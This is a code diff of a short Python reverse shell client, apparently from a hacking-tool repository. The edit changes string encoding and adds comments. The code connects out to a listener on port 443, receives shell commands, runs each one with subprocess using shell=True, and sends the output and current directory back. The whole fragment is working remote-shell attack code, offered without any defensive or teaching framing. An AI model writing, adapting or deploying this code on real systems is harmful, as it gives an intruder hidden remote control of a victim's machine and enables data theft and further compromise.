@@ -9,7 +9,7 @@ PORT = 443 # The same port as listener.
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((HOST, PORT)) # Connect to listener.
-s.send(bytes("[*] Connection Established!", "UTF-8")) # Send connection confirmation.
+s.send(str.encode("[*] Connection Established!")) # Send connection confirmation.
 
 while 1: # Start loop.
     data = s.recv(1024).decode("UTF-8") # Recieve shell command.
@@ -21,10 +21,9 @@ while 1: # Start loop.
     if len(data) > 0:
         proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 
         stdout_value = proc.stdout.read() + proc.stderr.read() # Read output.
-        #s.send(bytes(stdout_value)) # Send output to listener.
-        output_str = str(stdout_value,"UTF-8")
-        currentWD = os.getcwd() + "> "
-        s.send(str.encode(output_str + currentWD))
+        output_str = str(stdout_value) # Format output.
+        currentWD = os.getcwd() + "> " # Get current working directory.
+        s.send(str.encode(output_str + currentWD)) # Send output to listener.
     
 s.close() # Close socket.
 
